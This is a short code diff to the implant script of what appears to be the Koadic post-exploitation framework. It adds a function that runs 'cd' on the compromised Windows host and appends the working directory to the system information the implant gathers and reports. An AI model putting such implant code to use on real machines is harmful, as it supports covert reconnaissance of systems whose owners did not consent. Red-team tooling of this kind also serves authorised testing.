@@ -168,6 +168,19 @@ Koadic.user.Arch = function()
     return "Unknown";
 }
 
+Koadic.user.CWD = function()
+{
+    try
+    {
+        cwd = Koadic.shell.exec("cd", "%TEMP%\\cwd.txt");
+        return cwd;
+    }
+    catch(e)
+    {}
+
+    return "";
+}
+
 
 Koadic.user.info = function()
 {
@@ -181,6 +194,7 @@ Koadic.user.info = function()
     info += "~~~" + Koadic.user.OS();
     info += "~~~" + Koadic.user.DC();
     info += "~~~" + Koadic.user.Arch();
+    info += "~~~" + Koadic.user.CWD();
 
     return info;
 }
